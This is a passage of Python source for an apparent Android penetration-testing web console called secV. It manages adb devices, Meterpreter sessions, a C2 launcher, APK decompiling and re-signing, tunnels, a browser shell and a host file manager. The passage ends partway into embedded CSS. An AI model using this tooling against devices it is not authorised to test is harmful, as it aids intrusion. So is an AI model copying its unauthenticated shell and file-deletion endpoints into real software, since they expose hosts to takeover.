            if "Meterpreter" in line or "meterpreter" in line:
                sessions.append(line.strip())
        self._json({"sessions": sessions, "running": bool(_msf_proc and _msf_proc.poll() is None)})

    # ── PTY shell ─────────────────────────────────────────────────────────────

    def _api_pty_start(self, body: dict):
        global _pty_fd, _pty_pid, _pty_session
        with _pty_lock:
            # kill stale PTY
            if _pty_pid:
                try:
                    os.kill(_pty_pid, 9)
                except Exception:
                    pass
                _pty_pid = None
                if _pty_fd is not None:
                    try: os.close(_pty_fd)
                    except Exception: pass
                    _pty_fd = None
            _pty_session += 1
            _pty_buf.clear()

        cols = int(body.get("cols", 220))
        rows = int(body.get("rows", 40))
        shell = shutil.which("zsh") or shutil.which("bash") or "/bin/sh"

        pid, fd = pty.fork()
        if pid == 0:
            # child — set TERM and exec shell
            os.environ["TERM"]  = "xterm-256color"
            os.environ["LINES"] = str(rows)
            os.environ["COLUMNS"] = str(cols)
            os.execlp(shell, shell)
        else:
            # parent
            import fcntl, termios as _t
            _resize_pty(fd, rows, cols)
            with _pty_lock:
                _pty_fd  = fd
                _pty_pid = pid
            threading.Thread(target=_pty_reader, daemon=True).start()
            self._json({"ok": True, "pid": pid, "shell": shell})

    def _api_pty_input(self, body: dict):
        text = body.get("text", "")
        with _pty_lock:
            fd = _pty_fd
        if fd is None:
            self._json({"ok": False, "error": "no PTY"}); return
        try:
            os.write(fd, text.encode("utf-8", errors="replace"))
            self._json({"ok": True})
        except OSError as e:
            self._json({"ok": False, "error": str(e)})

    def _api_pty_resize(self, body: dict):
        rows = int(body.get("rows", 24))
        cols = int(body.get("cols", 80))
        with _pty_lock:
            fd = _pty_fd
        if fd is not None:
            _resize_pty(fd, rows, cols)
        self._json({"ok": True})

    def _api_pty_kill(self):
        global _pty_pid, _pty_fd
        with _pty_lock:
            pid, fd = _pty_pid, _pty_fd
            _pty_pid = None
            _pty_fd  = None
        if pid:
            try: os.kill(pid, 9)
            except Exception: pass
        if fd is not None:
            try: os.close(fd)
            except Exception: pass
        _broadcast_pty("\r\n\x1b[33m[shell killed]\x1b[0m\r\n")
        self._json({"ok": True})

    def _api_pty_stream(self):
        """SSE stream — sends PTY output to browser."""
        qs = parse_qs(urlparse(self.path).query)
        client_sid = int((qs.get("sid") or ["0"])[0])
        q: queue.Queue = queue.Queue(maxsize=2000)
        with _pty_lock:
            _pty_clients.append(q)
            # send session ID handshake first
            try: q.put_nowait(json.dumps({"pty_sid": _pty_session}))
            except queue.Full: pass
            # only replay buffer when client is reconnecting to same session
            if client_sid == _pty_session:
                for chunk in list(_pty_buf):
                    try: q.put_nowait(chunk)
                    except queue.Full: break
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream; charset=utf-8")
        self.send_header("Cache-Control", "no-cache")
        self._cors()
        self.end_headers()
        try:
            while True:
                try:
                    chunk = q.get(timeout=15)
                    escaped = json.dumps(chunk)
                    self.wfile.write(f"data: {escaped}\n\n".encode())
                    self.wfile.flush()
                except queue.Empty:
                    self.wfile.write(b": keepalive\n\n")
                    self.wfile.flush()
        except (BrokenPipeError, ConnectionResetError):
            pass
        finally:
            with _pty_lock:
                try: _pty_clients.remove(q)
                except ValueError: pass

    # ── proc stream ───────────────────────────────────────────────────────────

    def _api_proc_list(self):
        """One-shot JSON process list for the current device."""
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        filt   = (qs.get("filter") or [""])[0].lower()
        prefix = ["-s", serial] if serial else []
        out    = _adb(*prefix, "shell", "ps", "-A", "2>/dev/null")
        procs  = []
        for line in out.splitlines():
            parts = line.split()
            if len(parts) < 9 or parts[0] == "USER":
                continue
            name = parts[-1]
            if filt and filt not in name.lower() and filt not in parts[1]:
                continue
            procs.append({"user": parts[0], "pid": parts[1],
                          "ppid": parts[2], "state": parts[7] if len(parts) > 7 else "?",
                          "name": name})
        self._json({"procs": procs, "total": len(procs)})

    def _api_proc_stream(self):
        """SSE stream — pushes updated process list every 2 s."""
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        filt   = (qs.get("filter") or [""])[0].lower()
        prefix = ["-s", serial] if serial else []
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream; charset=utf-8")
        self.send_header("Cache-Control", "no-cache")
        self._cors()
        self.end_headers()
        try:
            while True:
                out   = _adb(*prefix, "shell", "ps", "-A", "2>/dev/null")
                procs = []
                for line in out.splitlines():
                    parts = line.split()
                    if len(parts) < 9 or parts[0] == "USER":
                        continue
                    name = parts[-1]
                    if filt and filt not in name.lower() and filt not in parts[1]:
                        continue
                    procs.append({"user": parts[0], "pid": parts[1],
                                  "ppid": parts[2], "state": parts[7] if len(parts) > 7 else "?",
                                  "name": name})
                payload = json.dumps({"procs": procs, "ts": time.time()})
                self.wfile.write(f"data: {payload}\n\n".encode())
                self.wfile.flush()
                time.sleep(2)
        except (BrokenPipeError, ConnectionResetError):
            pass

    # ── devinfo ────────────────────────────────────────────────────────────────

    def _api_devinfo(self):
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        prefix = ["-s", serial] if serial else []
        props  = {}
        for prop in ["ro.product.model", "ro.product.brand", "ro.build.version.release",
                     "ro.build.version.sdk", "ro.product.cpu.abi", "ro.serialno"]:
            val = _adb(*prefix, "shell", "getprop", prop)
            props[prop] = val.strip()
        self._json(props)

    def _api_applist(self):
        qs       = parse_qs(urlparse(self.path).query)
        serial   = (qs.get("serial") or [""])[0]
        prefix   = ["-s", serial] if serial else []
        out      = _adb(*prefix, "shell", "pm", "list", "packages", "-3")
        packages = sorted(l.replace("package:", "").strip() for l in out.splitlines() if l.startswith("package:"))
        self._json({"packages": packages})

    def _api_status(self):
        with _sessions_lock:
            running = [s for s in _sessions.values() if s["status"] == "running"]
        self._json({
            "running":  len(running) > 0,
            "count":    len(running),
            "op":       ", ".join(s["op"] for s in running) if running else "",
            "pid":      running[0]["pid"] if len(running) == 1 else None,
            "sessions": [{"id": s["id"], "op": s["op"],
                          "device": s.get("device", ""), "pid": s["pid"]}
                         for s in running],
        })

    def _api_sessions(self):
        now = time.time()
        with _sessions_lock:
            rows = [{
                "id":      s["id"],
                "op":      s["op"],
                "device":  s.get("device", ""),
                "status":  s["status"],
                "pid":     s["pid"],
                "elapsed": round((s.get("end_ts") or now) - s["start_ts"], 1),
                "color":   _SESSION_COLORS[s["id"] % len(_SESSION_COLORS)],
            } for s in _sessions.values()]
        self._json({"sessions": rows})

    def _api_run(self, body: dict):
        global _session_seq
        with _sessions_lock:
            _session_seq += 1
            sid = _session_seq
            _sessions[sid] = {
                "id":       sid,
                "op":       body.get("params", {}).get("operation", "?"),
                "device":   body.get("params", {}).get("device", ""),
                "start_ts": time.time(),
                "end_ts":   None,
                "status":   "starting",
                "pid":      None,
                "proc":     None,
            }
        threading.Thread(target=_run_session, args=(sid, body), daemon=True).start()
        self._json({"ok": True, "session_id": sid})

    def _api_kill(self):
        qs  = parse_qs(urlparse(self.path).query)
        sid = int((qs.get("session") or ["0"])[0])
        killed = []
        with _sessions_lock:
            targets = ([_sessions[sid]] if sid and sid in _sessions
                       else [s for s in _sessions.values() if s["status"] == "running"])
        for s in targets:
            p = s.get("proc")
            if p and p.poll() is None:
                try:
                    p.terminate()
                    killed.append(s["id"])
                    _broadcast(f"\x1b[31m[!] Session #{s['id']} ({s['op']}) killed\x1b[0m")
                except Exception as e:
                    _broadcast(f"\x1b[31m[!] Kill #{s['id']} failed: {e}\x1b[0m")
        self._json({"ok": True, "killed": killed})

    def _api_adb(self, body: dict):
        args = body.get("args", [])
        if not isinstance(args, list):
            self._json({"output": "invalid args"})
            return
        out = _adb(*args)
        self._json({"output": out})

    def _api_qr(self):
        self._json({"qr": list(_captured_qr)})

    def _api_get_settings(self):
        self._json({"settings": _gui_settings})

    def _api_lhost(self):
        import socket as _sock
        ip = ""
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
        except Exception:
            pass
        self._json({"lhost": ip})

    def _api_deps(self):
        # detect distro package manager
        pkg_mgr = "apt"
        for m in ("yay", "paru", "pacman", "dnf", "zypper", "brew", "apt"):
            if shutil.which(m):
                pkg_mgr = m
                break

        def _inst(apt="", pacman="", pip="", manual=""):
            if pkg_mgr in ("yay", "paru") and pacman:
                return f"{pkg_mgr} -S {pacman.split()[-1]}"
            if pkg_mgr == "pacman" and pacman:
                return f"pacman -S {pacman.split()[-1]}"
            if pkg_mgr == "dnf" and apt:
                return f"dnf install {apt.split()[-1]}"
            if pkg_mgr in ("apt", "apt-get") and apt:
                return f"apt install {apt}"
            return manual or pip or pacman or apt

        tools = {
            # system tools
            "adb":         {"cmd":"adb",        "install":_inst(apt="adb",         pacman="android-tools")},
            "apktool":     {"cmd":"apktool",     "install":_inst(apt="apktool",     pacman="apktool")},
            "aapt2":       {"cmd":"aapt2",       "install":_inst(manual="via Android SDK build-tools")},
            "aapt":        {"cmd":"aapt",        "install":_inst(apt="aapt",        pacman="android-tools")},
            "jadx":        {"cmd":"jadx",        "install":_inst(apt="jadx",        pacman="jadx")},
            "keytool":     {"cmd":"keytool",     "install":_inst(apt="default-jdk", pacman="jdk-openjdk")},
            "msfvenom":    {"cmd":"msfvenom",    "install":_inst(apt="metasploit-framework", manual="yay -S metasploit  # Arch AUR")},
            "msfconsole":  {"cmd":"msfconsole",  "install":_inst(apt="metasploit-framework", manual="yay -S metasploit  # Arch AUR")},
            "frida":       {"cmd":"frida",       "install":"pip3 install frida-tools"},
            "objection":   {"cmd":"objection",   "install":"pip3 install objection"},
            "bore":        {"cmd":"bore",        "install":_inst(pacman="bore-bin", manual="cargo install bore-cli  # or download from github.com/ekzhang/bore/releases")},
            "cloudflared": {"cmd":"cloudflared", "install":_inst(apt="cloudflared", pacman="cloudflared")},
            "nmap":        {"cmd":"nmap",        "install":_inst(apt="nmap",        pacman="nmap")},
            "qrencode":    {"cmd":"qrencode",    "install":_inst(apt="qrencode",    pacman="qrencode")},
            "ssh":         {"cmd":"ssh",         "install":_inst(apt="openssh-client", pacman="openssh")},
            # python modules
            "paramiko":    {"cmd":None, "pymod":"paramiko",     "install":"pip3 install paramiko"},
            "requests":    {"cmd":None, "pymod":"requests",     "install":"pip3 install requests"},
            "qrcode":      {"cmd":None, "pymod":"qrcode",       "install":"pip3 install qrcode[pil]"},
            "cryptography":{"cmd":None, "pymod":"cryptography", "install":"pip3 install cryptography"},
            "frida-py":    {"cmd":None, "pymod":"frida",        "install":"pip3 install frida"},
            "PIL":         {"cmd":None, "pymod":"PIL",          "install":"pip3 install Pillow"},
        }
        result = {}
        for name, info in tools.items():
            if info.get("cmd"):
                ok = shutil.which(info["cmd"]) is not None
            else:
                try:
                    __import__(info["pymod"])
                    ok = True
                except ImportError:
                    ok = False
            result[name] = {"ok": ok, "install": info["install"]}
        self._json({"deps": result, "pkg_mgr": pkg_mgr})

    # ── FILE MANAGER — host fs ────────────────────────────────────────────────

    def _api_fs_list(self):
        qs   = parse_qs(urlparse(self.path).query)
        raw  = (qs.get("path") or [""])[0].strip()
        path = Path(raw).expanduser() if raw else Path.home()
        if not path.is_absolute():
            path = Path.home() / path
        if not path.exists():
            self._json({"error": "not found", "path": str(path)}); return
        if path.is_file():
            st = path.stat()
            self._json({"type": "file", "path": str(path),
                        "size": st.st_size, "mtime": int(st.st_mtime)}); return
        entries = []
        try:
            for item in sorted(path.iterdir(), key=lambda x: (x.is_file(), x.name.lower())):
                try:
                    st = item.stat()
                    entries.append({
                        "name": item.name,
                        "path": str(item),
                        "type": "dir" if item.is_dir() else "file",
                        "size": st.st_size if item.is_file() else 0,
                        "mtime": int(st.st_mtime),
                        "ext": item.suffix.lower() if item.is_file() else "",
                    })
                except PermissionError:
                    entries.append({"name": item.name, "path": str(item),
                                    "type": "dir" if item.is_dir() else "file",
                                    "size": 0, "mtime": 0, "ext": "", "noaccess": True})
        except PermissionError:
            self._json({"error": "permission denied", "path": str(path)}); return
        parent = str(path.parent) if path != path.parent else None
        self._json({"path": str(path), "parent": parent, "entries": entries})

    def _api_fs_read(self):
        qs   = parse_qs(urlparse(self.path).query)
        raw  = (qs.get("path") or [""])[0].strip()
        path = Path(raw)
        if not path.is_file():
            self._json({"error": "not a file"}); return
        try:
            size = path.stat().st_size
            if size > 512_000:
                self._json({"error": "file too large (>512KB) — use download instead",
                            "size": size}); return
            content = path.read_bytes()
            try:
                text = content.decode("utf-8")
                self._json({"text": text, "size": size, "binary": False})
            except UnicodeDecodeError:
                import base64
                self._json({"b64": base64.b64encode(content).decode(),
                            "size": size, "binary": True})
        except Exception as e:
            self._json({"error": str(e)})

    def _api_fs_download(self):
        qs   = parse_qs(urlparse(self.path).query)
        raw  = (qs.get("path") or [""])[0].strip()
        path = Path(raw)
        if not path.is_file():
            self._send(404, "text/plain", b"not found"); return
        try:
            data = path.read_bytes()
            self.send_response(200)
            ct = "application/octet-stream"
            if path.suffix in (".apk", ".aab"):    ct = "application/vnd.android.package-archive"
            elif path.suffix == ".txt":              ct = "text/plain"
            elif path.suffix in (".json", ".yml"):   ct = "application/json"
            self.send_header("Content-Type", ct)
            self.send_header("Content-Disposition",
                             f'attachment; filename="{path.name}"')
            self._cors()
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        except Exception as e:
            self._send(500, "text/plain", str(e).encode())

    def _api_fs_delete(self, body: dict):
        path = Path(body.get("path", ""))
        if not path.exists():
            self._json({"ok": False, "error": "not found"}); return
        try:
            if path.is_dir():
                shutil.rmtree(str(path))
            else:
                path.unlink()
            self._json({"ok": True})
        except Exception as e:
            self._json({"ok": False, "error": str(e)})

    def _api_fs_rename(self, body: dict):
        src = Path(body.get("src", ""))
        dst = Path(body.get("dst", ""))
        if not src.exists():
            self._json({"ok": False, "error": "source not found"}); return
        try:
            src.rename(dst)
            self._json({"ok": True, "path": str(dst)})
        except Exception as e:
            self._json({"ok": False, "error": str(e)})

    def _api_fs_mkdir(self, body: dict):
        path = Path(body.get("path", ""))
        try:
            path.mkdir(parents=True, exist_ok=True)
            self._json({"ok": True, "path": str(path)})
        except Exception as e:
            self._json({"ok": False, "error": str(e)})

    def _api_fs_upload(self, raw_bytes: bytes):
        dest_dir = self.headers.get("X-Dest-Dir", "")
        filename  = self.headers.get("X-Filename", "upload.bin")
        dest_dir  = Path(dest_dir) if dest_dir else Path.home() / ".secv" / "android"
        dest_dir.mkdir(parents=True, exist_ok=True)
        dest = dest_dir / Path(filename).name
        try:
            dest.write_bytes(raw_bytes)
            self._json({"ok": True, "path": str(dest), "size": len(raw_bytes)})
        except Exception as e:
            self._json({"ok": False, "error": str(e)})

    # ── FILE MANAGER — device fs ──────────────────────────────────────────────

    def _api_device_fs_list(self):
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        path   = (qs.get("path") or ["/sdcard"])[0]
        prefix = (["-s", serial] if serial else [])
        out    = _adb(*prefix, "shell", f"ls -la '{path}' 2>&1")
        entries = []
        for line in out.splitlines():
            if line.startswith("total") or not line.strip():
                continue
            parts = line.split(None, 7)
            if len(parts) < 7:
                continue
            perms = parts[0]
            size  = parts[4] if len(parts) > 4 else "0"
            name  = parts[-1].strip() if len(parts) >= 7 else "?"
            if name in (".", ".."):
                continue
            is_dir = perms.startswith("d") or perms.startswith("l")
            entries.append({
                "name": name,
                "path": path.rstrip("/") + "/" + name,
                "type": "dir" if is_dir else "file",
                "perms": perms,
                "size": size,
            })
        parent = "/".join(path.rstrip("/").split("/")[:-1]) or "/"
        self._json({"path": path, "parent": parent if path != "/" else None,
                    "entries": entries, "error": out if not entries and out.strip() else None})

    def _api_device_fs_pull(self, body: dict):
        serial  = body.get("serial", "")
        remote  = body.get("remote", "")
        local   = body.get("local", "")
        if not remote:
            self._json({"ok": False, "error": "remote path required"}); return
        prefix  = (["-s", serial] if serial else [])
        if not local:
            dest_dir = Path.home() / ".secv" / "android" / "pulled"
            dest_dir.mkdir(parents=True, exist_ok=True)
            local = str(dest_dir / Path(remote).name)
        rc, out, err = (lambda r: (r.returncode, r.stdout.decode(errors="replace"),
                                   r.stderr.decode(errors="replace")))(
            subprocess.run([shutil.which("adb") or "adb"] + prefix + ["pull", remote, local],
                           capture_output=True, timeout=120)
        )
        ok = rc == 0 and Path(local).exists()
        self._json({"ok": ok, "local": local if ok else None,
                    "output": out + err})

    def _api_device_fs_push(self, body: dict):
        serial = body.get("serial", "")
        local  = body.get("local", "")
        remote = body.get("remote", "")
        if not local or not remote:
            self._json({"ok": False, "error": "local and remote required"}); return
        prefix = (["-s", serial] if serial else [])
        rc, out, err = (lambda r: (r.returncode, r.stdout.decode(errors="replace"),
                                   r.stderr.decode(errors="replace")))(
            subprocess.run([shutil.which("adb") or "adb"] + prefix + ["push", local, remote],
                           capture_output=True, timeout=120)
        )
        self._json({"ok": rc == 0, "output": out + err})

    def _api_device_apk_list(self):
        qs     = parse_qs(urlparse(self.path).query)
        serial = (qs.get("serial") or [""])[0]
        prefix = (["-s", serial] if serial else [])
        out    = _adb(*prefix, "shell", "pm list packages -f 2>/dev/null")
        apks   = []
        for line in out.splitlines():
            line = line.strip()
            if not line.startswith("package:"):
                continue
            try:
                rest = line[len("package:"):]
                eq   = rest.rfind("=")
                apk_path = rest[:eq]
                pkg      = rest[eq+1:]
                apks.append({"package": pkg, "apk_path": apk_path})
            except Exception:
                pass
        apks.sort(key=lambda x: x["package"])
        self._json({"apks": apks, "count": len(apks)})

    def _api_device_apk_pull(self, body: dict):
        serial  = body.get("serial", "")
        package = body.get("package", "")
        if not package:
            self._json({"ok": False, "error": "package required"}); return
        prefix = (["-s", serial] if serial else [])
        path_out = _adb(*prefix, "shell", f"pm path {package} 2>/dev/null")
        apk_path = None
        for line in path_out.splitlines():
            if line.startswith("package:"):
                apk_path = line[8:].strip(); break
        if not apk_path:
            self._json({"ok": False, "error": f"cannot locate APK for {package}"}); return
        dest_dir = Path.home() / ".secv" / "android" / "apks"
        dest_dir.mkdir(parents=True, exist_ok=True)
        local = str(dest_dir / f"{package}.apk")
        rc, out, err = (lambda r: (r.returncode, r.stdout.decode(errors="replace"),
                                   r.stderr.decode(errors="replace")))(
            subprocess.run([shutil.which("adb") or "adb"] + prefix + ["pull", apk_path, local],
                           capture_output=True, timeout=120)
        )
        if rc != 0 or not Path(local).exists():
            tmp = f"/sdcard/secv_pull_{package}.apk"
            _adb(*prefix, "shell", f"su -c 'cp {apk_path} {tmp}' 2>/dev/null || run-as {package} cat {apk_path} > {tmp}")
            rc, out, err = (lambda r: (r.returncode, r.stdout.decode(errors="replace"),
                                       r.stderr.decode(errors="replace")))(
                subprocess.run([shutil.which("adb") or "adb"] + prefix + ["pull", tmp, local],
                               capture_output=True, timeout=120)
            )
            _adb(*prefix, "shell", f"rm -f {tmp}")
        ok = Path(local).exists()
        self._json({"ok": ok, "local": local if ok else None,
                    "package": package, "output": out + err})

    def _api_apk_decompile(self, body: dict):
        apk  = body.get("apk", "")
        out  = body.get("out", "")
        if not apk or not Path(apk).is_file():
            self._json({"ok": False, "error": "apk not found"}); return
        apktool = shutil.which("apktool")
        if not apktool:
            self._json({"ok": False, "error": "apktool not installed"}); return
        apk_path = Path(apk)
        if not out:
            out = str(Path.home() / ".secv" / "android" / "decoded" / apk_path.stem)
        try:
            r = subprocess.run([apktool, "d", apk, "-o", out, "-f"],
                               capture_output=True, text=True, timeout=300)
            ok = r.returncode == 0 and Path(out).exists()
            self._json({"ok": ok, "out_dir": out if ok else None,
                        "stdout": r.stdout[-2000:], "stderr": r.stderr[-2000:]})
        except Exception as e:
            self._json({"ok": False, "error": str(e)})

    def _api_apk_recompile(self, body: dict):
        src  = body.get("src", "")
        out  = body.get("out", "")
        sign = body.get("sign", True)
        if not src or not Path(src).is_dir():
            self._json({"ok": False, "error": "decoded dir not found"}); return
        apktool = shutil.which("apktool")
        if not apktool:
            self._json({"ok": False, "error": "apktool not installed"}); return
        src_path = Path(src)
        if not out:
            out = str(Path.home() / ".secv" / "android" / "apks" /
                      (src_path.name + "_recompiled.apk"))
        try:
            r = subprocess.run([apktool, "b", src, "-o", out],
                               capture_output=True, text=True, timeout=300)
            ok = r.returncode == 0 and Path(out).exists()
            if ok and sign:
                ks = Path.home() / ".secv" / "android" / "secv_debug.keystore"
                if not ks.exists():
                    subprocess.run(["keytool", "-genkeypair", "-v",
                                    "-keystore", str(ks), "-alias", "secv",
                                    "-keyalg", "RSA", "-keysize", "2048",
                                    "-validity", "10000",
                                    "-dname", "CN=secV,O=secV,C=US",
                                    "-storepass", "secvpass", "-keypass", "secvpass"],
                                   capture_output=True, timeout=30)
                apksigner = shutil.which("apksigner")
                if apksigner:
                    subprocess.run([apksigner, "sign", "--ks", str(ks),
                                    "--ks-pass", "pass:secvpass",
                                    "--key-pass", "pass:secvpass", out],
                                   capture_output=True, timeout=60)
                else:
                    jarsigner = shutil.which("jarsigner")
                    if jarsigner:
                        subprocess.run([jarsigner, "-keystore", str(ks),
                                        "-storepass", "secvpass", out, "secv"],
                                       capture_output=True, timeout=60)
            self._json({"ok": ok, "out_apk": out if ok else None,
                        "stdout": r.stdout[-2000:], "stderr": r.stderr[-2000:]})
        except Exception as e:
            self._json({"ok": False, "error": str(e)})

    def _api_workdir(self):
        base = Path.home() / ".secv" / "android"
        files = []
        if base.exists():
            for p in sorted(base.rglob("*"))[-200:]:
                if p.is_file():
                    try:
                        files.append({
                            "path": str(p.relative_to(Path.home())),
                            "full": str(p),
                            "size": p.stat().st_size,
                            "mtime": int(p.stat().st_mtime),
                        })
                    except Exception:
                        pass
        files.sort(key=lambda x: x["mtime"], reverse=True)
        self._json({"files": files[:100], "base": str(base)})

    def _api_settings(self, body: dict):
        _gui_settings.update({k: v for k, v in body.items() if k in
            ("lhost", "lport", "bore_server", "nvd_api_key", "c2_host", "c2_port")})
        self._json({"ok": True, "settings": _gui_settings})

    def _api_c2_status(self):
        qs   = parse_qs(urlparse(self.path).query)
        port = int((qs.get("port") or [str(_C2_PORT)])[0])
        self._json({"running": _c2_running(), "port": port,
                    "url": f"http://127.0.0.1:{port}"})

    def _api_c2_launch(self):
        qs   = parse_qs(urlparse(self.path).query)
        port = int((qs.get("port") or [str(_C2_PORT)])[0])
        ok   = _ensure_c2(port)
        self._json({"ok": ok, "port": port, "url": f"http://127.0.0.1:{port}"})

    def _api_c2_stop(self):
        global _c2_proc
        with _proc_lock:
            p = _c2_proc
        if p:
            try:
                p.terminate()
                _c2_proc = None
            except Exception:
                pass
        self._json({"ok": True})

    def _api_sse(self):
        q: queue.Queue = queue.Queue(maxsize=512)
        with _sse_lock:
            _sse_clients.append(q)
        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-cache")
        self.send_header("X-Accel-Buffering", "no")
        self._cors()
        self.end_headers()
        try:
            while True:
                try:
                    line = q.get(timeout=20)
                    data = "data: " + line.replace("\n", " ") + "\n\n"
                    self.wfile.write(data.encode())
                    self.wfile.flush()
                except queue.Empty:
                    self.wfile.write(b": keepalive\n\n")
                    self.wfile.flush()
        except Exception:
            pass
        finally:
            with _sse_lock:
                try: _sse_clients.remove(q)
                except ValueError: pass

    def _serve_html(self):
        html = _HTML.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self._cors()
        self.send_header("Content-Length", str(len(html)))
        self.end_headers()
        self.wfile.write(html)


# ── Embedded HTML ──────────────────────────────────────────────────────────────
_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>secV · Android Pentest</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#060606;--bg1:rgba(14,14,14,0.92);--bg2:rgba(22,22,22,0.94);--bg3:#1e1e1e;--bg4:#282828;
  --border:rgba(255,255,255,0.07);--border2:rgba(255,255,255,0.14);--border3:rgba(255,255,255,0.28);
  --text:#a8a8a8;--muted:#505050;--white:#e8e8e8;--off:#c8c8c8;--grey:#888888;
  --grey2:#666666;--grey3:#3a3a3a;--silver:#b0b0b0;
  --green:#4caf50;--red:#e53935;--blue:#3d8bcd;--green-dim:rgba(76,175,80,0.15);
  --red-dim:rgba(229,57,53,0.12);--blue-dim:rgba(61,139,205,0.12);
  --accent:#44ddff;--accent-dim:rgba(68,221,255,0.10);--accent-glow:rgba(68,221,255,0.25);
  --python:#3572A5;--ruby:#CC342D;--rust:#f74c00;--clang:#5c8ab4;--bash:#89E051;--pwsh:#00BFFF;
  --mono:'JetBrains Mono',monospace;--disp:'Syne',sans-serif;--t:0.14s ease;
  /* category accent colors */
  --cat-recon:#64b5f6;--cat-access:#ff7043;--cat-payload:#44ddff;
  --cat-instr:#ce93d8;--cat-persist:#ffb74d;--cat-c2:#66bb6a;
  --cat-evasion:#f06292;--cat-auto:#ffa726;
}
*{box-sizing:border-box;margin:0;padding:0;}
html{-webkit-font-smoothing:antialiased;}
body{background:#060606;color:var(--text);font-family:var(--mono);
  height:100vh;display:flex;flex-direction:column;overflow:hidden;font-size:13px;line-height:1.6;}

/* CODE RAIN CANVAS */
#code-bg{
  position:fixed;top:0;left:0;width:100%;height:100%;
  z-index:0;pointer-events:none;opacity:1;
}
/* raise non-canvas body children above the canvas without overriding their position */
#topbar,#sessions-bar,#main,#statusbar,#toast-container{position:relative;z-index:1;}
/* fixed overlays keep their own position:fixed — don't touch sess-drawer */

/* GLOBAL GLOW ANIMATIONS */
@keyframes accentGlow{
  0%,100%{box-shadow:0 0 6px var(--accent-glow),0 0 14px var(--accent-dim);}
  50%{box-shadow:0 0 12px var(--accent-glow),0 0 28px var(--accent-dim),0 0 40px rgba(68,221,255,0.08);}
}
@keyframes borderSlide{
  0%{background-position:0% 50%;}
  50%{background-position:100% 50%;}
  100%{background-position:0% 50%;}
}
@keyframes logoShimmer{
  0%,100%{text-shadow:0 0 8px rgba(255,255,255,0.15);}
  50%{text-shadow:0 0 18px rgba(68,221,255,0.4),0 0 32px rgba(68,221,255,0.15);}
}
@keyframes runGlow{
  0%,100%{box-shadow:0 0 0px transparent;}
  50%{box-shadow:0 0 16px rgba(76,175,80,0.6),0 0 32px rgba(76,175,80,0.25);}
}
@keyframes pillFloat{
  0%,100%{transform:translateY(0);}
  50%{transform:translateY(-1px);}
}
@keyframes dotBlink{
  0%,100%{opacity:1;} 50%{opacity:0.3;}
}
a{color:var(--blue);text-decoration:none;}
::-webkit-scrollbar{width:3px;height:3px;}
::-webkit-scrollbar-track{background:var(--bg);}
::-webkit-scrollbar-thumb{background:var(--bg4);}

/* ── CUSTOM FORM ELEMENTS ─────────────────────────────────────── */
select{
  -webkit-appearance:none;appearance:none;
  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='6' viewBox='0 0 10 6'%3E%3Cpath d='M0 0l5 6 5-6z' fill='%2344ddff' opacity='0.6'/%3E%3C/svg%3E");
  background-repeat:no-repeat;background-position:right 9px center;
  background-size:8px 5px;padding-right:26px !important;cursor:pointer;
}
input[type=checkbox]{
  -webkit-appearance:none;appearance:none;
  width:14px;height:14px;flex-shrink:0;
  border:1px solid var(--border2);background:var(--bg2);
  cursor:pointer;position:relative;
  transition:border-color var(--t),background var(--t),box-shadow var(--t);
  vertical-align:middle;border-radius:2px;
}
input[type=checkbox]:checked{
  background:var(--accent);border-color:var(--accent);
  box-shadow:0 0 6px var(--accent-dim);
}
input[type=checkbox]:checked::after{
  content:'';position:absolute;left:4px;top:1px;
  width:4px;height:8px;
  border:1.5px solid #060606;border-top:none;border-left:none;
  transform:rotate(45deg);
}
input[type=checkbox]:hover:not(:checked){border-color:var(--border3);}
input[type=checkbox]:focus{outline:none;}

/* SESSIONS BAR */
#sessions-bar{
  display:none;align-items:center;gap:8px;padding:7px 18px;
  background:var(--bg1);border-bottom:2px solid var(--border2);
  flex-shrink:0;overflow-x:auto;min-height:38px;
}
#sessions-bar.visible{display:flex;}
#sess-label{
  font-size:0.62rem;letter-spacing:0.12em;text-transform:uppercase;
  color:var(--silver);flex-shrink:0;margin-right:6px;font-weight:600;
}
.sess-pill{
  display:flex;align-items:center;gap:7px;
  border:1px solid var(--border2);border-radius:3px;
  padding:4px 11px 4px 8px;
  font-family:var(--mono);font-size:0.68rem;letter-spacing:0.03em;
  white-space:nowrap;transition:border-color var(--t),background var(--t);
  cursor:default;
}
.sess-pill:hover{border-color:var(--border3);background:var(--bg2);}
.sess-pill .sp-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
.sess-pill .sp-dot.running{animation:pulse .8s infinite;}
.sess-pill .sp-label{color:var(--white);font-weight:500;font-size:0.68rem;}
.sess-pill .sp-op{
  color:var(--accent);font-size:0.64rem;letter-spacing:0.05em;
  background:rgba(100,220,255,0.08);padding:1px 5px;border-radius:2px;
}
.sess-pill .sp-dev{color:var(--muted);font-size:0.62rem;margin-left:2px;}
.sess-pill .sp-time{
  color:var(--muted);font-size:0.63rem;margin-left:2px;
  min-width:28px;text-align:right;
}
.sess-pill .sp-kill{
  background:none;border:none;cursor:pointer;
  color:var(--muted);font-size:0.75rem;padding:0 0 0 5px;
  line-height:1;transition:color var(--t);
}
.sess-pill .sp-kill:hover{color:var(--red);}
.sess-pill.running{border-color:rgba(100,220,255,0.3);}
.sess-pill.done    .sp-dot{background:var(--muted)!important;}
